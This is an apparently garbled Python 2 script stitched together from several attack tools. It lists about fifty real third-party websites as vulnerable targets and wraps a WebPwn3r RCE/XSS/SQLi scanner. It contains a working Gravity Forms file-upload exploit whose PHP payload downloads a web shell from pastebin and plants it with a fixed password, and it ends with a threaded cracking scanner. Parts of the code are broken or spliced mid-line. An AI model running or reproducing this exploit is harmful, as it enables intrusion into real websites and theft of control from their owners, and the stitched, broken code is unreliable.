#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
# -*- encoding: utf-8 -*-
from colorama import init
from termcolor import colored
import time
import sys
import os 
import re
import urllib
from headers import *
from vulnz import *
import json
import getopt 
import socket
import requests
import urlparse
from core.lib import http
from core.lib import parser 
from core.lib import colors 
from core.lib import printer
from core.recon import google
from core.recon import bing
from core.recon import pgp
from core.recon import yahoo
from core.recon import netcraft
import urllib2
import threading
import random
from lib.cmdline import parse_args
from lib.consle_width import getTerminalSize
from lib.proxy import load_proxy
from lib.queue import gen_queue
from lib.request_file import parse_request
from lib.request import do_request
from lib.colorama import init, Fore, Back, Style

toolbar_width = 80

# setup toolbar
sys.stdout.write("[%s]" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1)) # return to start of line, after '['

for i in xrange(toolbar_width):
    time.sleep(0.1) # do real work here
    # update the bar
    sys.stdout.write("loading...") 
    sys.stdout.flush()

sys.stdout.write("\n")

toolbar_width = 30

# setup toolbar
sys.stdout.write("[%s]" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1)) # return to start of line, after '['

for i in xrange(toolbar_width):
    time.sleep(0.3) # do real work here
    # update the bar
    sys.stdout.write("*")
    sys.stdout.flush()

sys.stdout.write("\n")
    
    
init()
print ' '
print(colored('===================', 'green'))
print(colored('48 url add to the list', 'green', 'on_red'))
print(colored('===================', 'green'))
print ' '
os.system("pause")
print(colored('Hello, World!', 'green'))
print(colored('welcome to Websites Vulnerables', 'red'))
print ' '
print 'websitesvulnerables commands for infoga'
print 'websitesvulnerables.py -t target domain -s --source\tData source: [all,google,bing,yahoo,pgp]'  
print ' '
os.system("pause")
print ' '
sys.stdout.write("\n")

toolbar_width = 70

# setup toolbar
sys.stdout.write("[%s]" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1)) # return to start of line, after '['

for i in xrange(toolbar_width):
    time.sleep(0.05) # do real work here
    # update the bar
    sys.stdout.write("+")
    sys.stdout.flush()

sys.stdout.write("\n")
print ' '
print ' '
print ' '
print ' '
print(colored('https://moodle.org/mod/forum/discuss.php?d=79040', 'red', 'on_yellow'))
print(colored('http://www.uterra.com/codigo_php/codigo_php.php?ref=mi_primera_pagina_en_php', 'blueprint(colored('http://www.triestecontemporanea.it/pagina.php?id_p=38&l=e', 'blue'))
print(colored('http://www.winesofportugal.info/pagina.php?codNode=18012', 'blue'))
print(colored('http://www.emonfur.eu/pagina.php?sez=91&pag=554&label=EFUF+2013', 'blue'))
print(colored('http://www.talcahuano.cl/pagina.php?pg=historia.html&menu=historia', 'blue'))
print(colored('http://nvog-documenten.nl/richtlijn/pagina.php?fSelectNTG_85=86&fSelectedSub=85', 'blue'))
print(colored('http://www.insuleur.org/pagina.php?Cod_fam=3', 'blue'))
os.system("pause")
print(colored('http://www.eng.unicas.it/pagina.php?nodo=5&pagina=161', 'blue'))
print(colored('https://www.miromallorca.com/pagina.php?Cod_fam=1', 'red', 'on_yellow'))
print(colored('http://www.unilasalle.edu.br/canoas/pagina.php?id=98', 'blue'))
print(colored('http://www.stroom.nl/paginas/pagina.php?pa_id=1120200', 'blue'))
print(colored('http://www.congressoamp2016.com/pagina.php?area=25&pagina=301', 'blue'))
print(colored('https://www.sansebastianfestival.com/in/pagina.php?ap=3&id=3485', 'red', 'on_yellow'))
print(colored('http://www.ius-publicum.com/pagina.php?lang=it&pag=fascicolo', 'blue'))
print(colored('http://www.athiewohnrath.com.br/en/pagina.php?pag=tecnologia_interna', 'blue'))
print(colored('http://www.czga.ro/pagina.php?id=10', 'blue'))
print(colored('http://www.gattinara-online.com/ricette/archivio/pagina.php?id=&sz=pietanze', 'blue'))
os.system("pause")
print(colored('http://www.comellisrl.com/en/pagina.php?id=47', 'blue'))
print(colored('http://www.barrytowage.com/pagina.php?art=posizioneflotta', 'blue'))
print(colored('http://www.juventud-valencia.es/pagina.php?id=57', 'blue'))
print(colored('http://www.paleopatologia.it/attivita/pagina.php?recordID=41', 'blue'))
print(colored('http://www.bncf.firenze.sbn.it/pagina.php?id=154', 'blue'))
print(colored('http://conexionesimprobables.es/pagina.php?id_p=320', 'blue'))
print(colored('http://www.t-race.com/pagina.php?cod=1&lingua=eng', 'blue'))
print(colored('https://www.esec.pt/pagina.php?id=527', 'red', 'on_yellow'))
print(colored('http://www.fpciclismo.pt/pagina.php?id_pagina_new=2641&id_modalidade_new=6', 'blue'))
print(colored('http://www.aprenderaprogramar.com/index.php?option=com_content&view=article&id=540:conceptos-basicos-php-estructura-basica-pagina-etiquetas-apertura-y-cierre-embeber-en-html-cu00815b&catid=70&Itemid=193', 'blue'))
os.system("pause")
print 'http://www.fa.ulisboa.pt/docentes/index.php?option=com_content&view=article&id=1398%3Amaria-joao-de-carvalho-durao-dos-santos'
print 'http://www.fondazioneantonveneta.it/Pagina.php?ID=134'
print 'http://www.cardioonlineeurope.com/pagina.php?azienda=1'
print 'http://cristinaenea.org/pagina.php?queidioma=1&pg=32'
print 'http://www.prograd.ufrn.br/pagina.php?a=for_coord'
print 'http://www.oncoline.nl/richtlijn/item/pagina.php?richtlijn_id=598'
print 'http://www.lapassio.net/pagina.php?idMiniLloc=25'
print 'http://www.cff.org.br/pagina.php?id=87'
print 'http://www.powermatchingcity.nl/site/pagina.php?id=46'
print 'http://www.mikadonet.nl/pagina.php?id=english'
os.system("pause")
print 'http://www.circumetnea.it/pagina.php?tab=menu_icone&id=2'
print 'http://www.codage.ext.cnamts.fr/codif/bdm_it/index.php?p_site=AMELI'
print 'https://www.admission-postbac.fr/index.php?desc=comment'
print 'https://www.admission-postbac.fr/index.php?desc=notices'
print 'https://elearn.ens-cachan.fr/login/index.php?lang=en_utf8'
print 'http://webtv.coe.int/index.php?EventID=41'
print 'http://www.oiseauxdesjardins.fr/index.php?m_id=1127&item=18'
print 'https://www.securitykiss.com/index.php?lang=fr'
print 'http://crcf.ac-grenoble.fr/index.php?tg=topusr&cat=55'
print 'http://amazonia.transcriptome.eu/index.php?zone=PlasmaCell'
os.system("pause")

print ga.green+'''
	    __          __  _     _____                 ____       
	    \ \        / / | |   |  __ \               |___ \      
	     \ \  /\  / /__| |__ | |__) |_      ___ __   __) |_ __ 
	      \ \/  \/ / _ \ '_ \|  ___/\ \ /\ / / '_ \ |__ <| '__|
 	       \  /\  /  __/ |_) | |     \ V  V /| | | |___) | |   
 	        \/  \/ \___|_.__/|_|      \_/\_/ |_| |_|____/|_|   
                                                    
        ##############################################################
        #| "WebPwn3r" Web Applications Security Scanner              #
        #|  By Ebrahim Hegazy - @Zigoo0                              #
        #|  This Version Supports Remote Code/Command Execution, XSS #
        #|  And SQL Injection.                                       #
	#|  Thanks @lnxg33k, @dia2diab @Aelhemily, @okamalo          #
	#|  More Details: http://www.sec-down.com/wordpress/?p=373   #
        ##############################################################
        '''+ga.end

def urls_or_list():
	url_or_list = raw_input(" [!] Scan URL or List of URLs? [1/2]: ")
	if url_or_list == "1":
	 	 url = raw_input(" [!] Enter the URL: ")
		 #if not url.startswith("http://"):
		     #Thanks to Nu11 for the HTTP checker
                     #print ga.red+'''\n Invalid URL, Please Make Sure That The URL Starts With \"http://\" \n'''+ga.end
                     #exit()
	         if "?" in url: 
		 	rce_func(url)
		 	xss_func(url)
		 	error_based_sqli_func(url)
		 else:
			print ga.red +"\n [Warning] "+ ga.end + ga.bold+"%s"%url +ga.end + ga.red +" is not a valid URL"+ga.end			
			print ga.red +" [Warning] You should write a Full URL .e.g http://site.com/page.php?id=value \n"+ ga.end
	if url_or_list =="2":
		 urls_list = raw_input( ga.green+" [!] Enter the list file name .e.g [list.txt]: "+ga.end)
		 open_list = open(urls_list).readlines()
		 for line in open_list:
			 if "?" in line:
			 	links = line.strip()
		  	 	url = links
		  	 	print ga.green+" \n [!] Now Scanning %s"%url +ga.end
		  	 	rce_func(url)
			 	xss_func(url)
			 	error_based_sqli_func(url)
			 else:
			 	links = line.strip()
		  	 	url = links
				print ga.red +"\n [Warning] "+ ga.end + ga.bold+"%s"%url +ga.end + ga.red +" is not a valid URL"+ga.end				
				print ga.red +" [Warning] You should write a Full URL .e.g http://site.com/page.php?id=value \n"+ ga.end				

urls_or_list()

from optparse import *
from urllib2 import *
import sys
try:
    from pycurl import *
    from colorama import init,Fore,Back,Style
except ImportError as e:
    print '[-] -- Import Error: [%s]\n[-] -- Install it (pip install <module_name>)\n' % e
    sys.exit(0)
else:
    init(autoreset = True)
    # colors foreground text:
    fc = Fore.CYAN
    fg = Fore.GREEN
    fw = Fore.WHITE
    fr = Fore.RED
    fb = Fore.BLUE
    # colors style text:
    sd = Style.DIM
    sn = Style.NORMAL
    sb = Style.BRIGHT
#############################################################################################################
# list for saving header response
r = []
# list for saving Status of curl output
st = []
#  connection timeout
tm = 30
#  User Agent
ua = "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
# Headers
hd = ['Accept: text/html', 'Accept-Charset: UTF-8']

# php function for uploaading arbitrary file from remote server 
data = '<?php \nfunction http_get($url){ \n\t$c = curl_init($url);\n curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);\n\tcurl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);\n\tcurl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);\n curl_setopt($c, CURLOPT_HEADER, 0);\n return curl_exec($c);\n \tcurl_close($c);\n }\n $rootFile = $_SERVER["DOCUMENT_ROOT"] . "/r0ot.php" ;\n $Shelltxt = http_get("http://pastebin.com/raw/ewpifhxb");\n $out = fopen($rootFile, "w");\n fwrite($out, $Shelltxt); \n fclose($out);\n if(file_exists($rootFile)){\n     echo $rootFile."</br>";\n }else \n  echo "Failed file not exist";\n echo "Exploited .\n " ;?> &field_id=3&form_id=1&gform_unique_id=../../../&name=r0ot.php5'
'''
<?php 

function http_get($url)
{ 
	$c = curl_init($url);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($c, CURLOPT_HEADER, 0);
	return 
	curl_exec($c);
	curl_close($c);
}

	$rootFile = $_SERVER["DOCUMENT_ROOT"] . "/r0ot.php" ; 
	$Shelltxt = http_get("http://server/shell.txt"); 
	$out = fopen($rootFile, "w");
	fwrite($out, $Shelltxt); 
	fclose($out); 
	if(file_exists($rootFile))
	{     
	echo $rootFile."</br>"; 
	}else 
	echo "Failed to write"; 
	echo "Exploited .\n" ;
?>
'''

# GravityFalls banner taken from "https://www.exploit-db.com/exploits/39969/"
def banner():
    print fc + sb + """+------------------------------------------------------------+
|    _____                 _ _         ______    _ _         | 
|   / ____|               (_) |       |  ____|  | | |        |
|  | |  __ _ __ __ ___   ___| |_ _   _| |__ __ _| | |___     |
|  | | |_ | '__/ _` \ \ / / | __| | | |  __/ _` | | / __|    |
|  | |__| | | | (_| |\ V /| | |_| |_| | | | (_| | | \__ \    |
|   \_____|_|  \__,_| \_/ |_|\__|\__, |_|  \__,_|_|_|___/    |
|                                 __/ |                      |
|                                |___/  - By r0ot h3x49      |
| ---------------------------------------------------------- |
|               WordPress Plugin Gravity Form                |
|         Gravity Forms [WP] - Arbitrary File Upload         |
|              Version(s) : 1.8.19 (and below)               |
+------------------------------------------------------------+"""


##   Function for checking curl status output
def body(buf):
    st.append(buf)
    
##   Function for checking curl headers output
def header(buf):
    r.append(buf)


## Function that Creates and sends curl request using pycurl
def ExploitGravityForm(url, tgt, timeout, ua, head, bodyFunc, headerFunc, PostData):
    try:
        c = Curl()
        c.setopt(URL, url)
        c.setopt(CONNECTTIMEOUT, timeout)
        c.setopt(USERAGENT, ua)
        c.setopt(HTTPHEADER, head)
        c.setopt(WRITEFUNCTION, bodyFunc)
        c.setopt(HEADERFUNCTION, headerFunc)
        c.setopt(POSTFIELDS, PostData)
        c.perform()
    except error as e:
        print fr + sd + '[-] -- Unable to resolve the target '
    else:
        ConfirmExploit(tgt)


##  Function to confirm if target is vulnerable (exploitable) or not 
def ConfirmExploit(tgt):
    if 'http://' in tgt:
        Url = '%s/wp-content/uploads/_input_3_r0ot.php5' % tgt
        ShellUrl = '%s/r0ot.php' % tgt
    elif 'https://' in tgt:
        Url = '%s/wp-content/uploads/_input_3_r0ot.php5' % tgt
        ShellUrl = '%s/r0ot.php' % tgt
    else:
        Url = 'http://%s/wp-content/uploads/_input_3_r0ot.php5' % tgt
        ShellUrl = 'http://%s/r0ot.php' % tgt
        
    resp = r[0]
    status = st[0]
    if '200 OK' in resp and '"status":"ok"' in status:
        print fg + sb + '\n\n---------------------------------------------------------'
        print fw + sd + '[*] -- Exploited sucessfully .. '
        print fw + sd + '[*] -- Execute two or more times manually [%s]' % Url
        print fw + sd + '[*] -- Then check [%s] ' % ShellUrl
        print fw + sd + '[*] -- Shell password : r0ot@h3x49'
        print fg + sb + '---------------------------------------------------------\n\n'
        with open('ExploitableGravityFormTargets.txt','a') as ExploitedTgts:
            ExploitedTgts.write('[*] -- Target  : %s\n[*] -- Exploit : %s\n[*] -- Shell   : %s\n\n' % (tgt,Url,ShellUrl))    
        st[:] = []
        r[:]  = []
    else:
        print fr + sb + '[-] -- Target is not vulnerable to Gravity form exploit'
        st[:] = []
        r[:]  = []



def Main():
    
    banner()
    parser = OptionParser("Usage: %prog [Option] (target/list) ")
    parser.add_option("-u", dest="url", type="string" , \
                      help="Target URL (e.g:- http://abc.com)")
    parser.add_option("-l",dest="List", type="string" , \
                      help="List of URL(s) (e.g:- <filename>.txt)")

    (options, args) = parser.parse_args()
    print fg + sd + '\n----------------------------------------------------------------'
    print fg + sd + ' [*] -- Testing Exploit for wp-gravity form version <= (1.8.19)'
    print fg + sd + '----------------------------------------------------------------\n'
    if not options.url and not options.List:
        print parser.usage
        
    elif options.url and not options.List:

        if 'http://' in options.url:
            url = '%s/?gf_page=upload' % (options.url)
        elif 'https://' in options.url:
            url = '%s/?gf_page=upload' % (options.url)
        else:
            url = 'http://%s/?gf_page=upload' % (options.url)
            
        tgt = options.url
        print fg + sd + '[*] -- Target -->> (%s)' % tgt
        ExploitGravityForm(url, tgt, tm, ua, hd, body, header, data)
        ExploitedTgts.close()
    elif not options.url and options.List:
        f_in = open(options.List)
        ListOftgts = list(line for line in (l.strip() for l in f_in) if line)
        for tgt in  ListOftgts:
            if 'http://' in tgt:
                url = '%s/?gf_page=upload' % (tgt)
            elif 'https://' in tgt:
                url = '%s/?gf_page=upload' % (tgt)
            else:
                url = 'http://%s/?gf_page=upload' % (tgt)

                
            print fg + sd + '[*] -- Target -->> (%s)' % tgt 
            ExploitGravityForm(url, tgt, tm, ua, hd, body, header, data)
        l.close()
        ExploitedTgts.close()
    else:
        pass
    
if __name__ == '__main__':
    try:
        Main()
    except KeyboardInterrupt:
        print fr + sb + '[-] -- User interrupted'
        sys.exit(0)
    except Exception as e:
        pass

class Scanner():
    def __init__(self):
        init()
        self.console_width = getTerminalSize()[0] - 2
        self.lock = threading.Lock()
        self.STOP_ME = False
        parse_args(self)
        load_proxy(self)
        self.gen_params_queue()
        parse_request(self)

    def gen_params_queue(self):
        self.queue_thread = threading.Thread(target=gen_queue, args=(self,))
        self.queue_thread.start()

    def print_s(self, s, color_red=False):
        self.lock.acquire()
        print Fore.MAGENTA + s if color_red else Fore.RESET + s
        self.lock.release()

    def now_time(self):
        return time.strftime('%H:%M:%S', time.localtime())

    def run(self):
        self.start_time = time.time()
        self.cracked_count = 0
        self.print_s('Job started at %s' % self.now_time() + '\n' + '*' * s.console_width)
        for i in range(self.args.t):
            t = threading.Thread(target=do_request, args=(s,))
            t.setDaemon(True)
            t.start()
        try:
            while s.request_thread_count > 0:
                time.sleep(0.1)
            s.print_s('_' * s.console_width + '\nTask finished at %s. Cost %.2f seconds' %
                      (self.now_time(), time.time() - s.start_time) )
        except KeyboardInterrupt, e:
            s.STOP_ME = True
            time.sleep(1.0)
            s.print_s('_' * s.console_width + '\n[KeyboardInterrupt] \nTask aborted at %s, cost %.2f seconds' %
                      (self.now_time(), time.time() - s.start_time) )

        if s.args.checkproxy:
            s.print_s('Found %s proxy server(s) in total.' % s.cracked_count if s.cracked_count else 'No proxy servers found.')
        else:
            s.print_s('Cracked %s item(s) in total.' % s.cracked_count if s.cracked_count else 'No one was cracked.')


s = Scanner()
s.run()

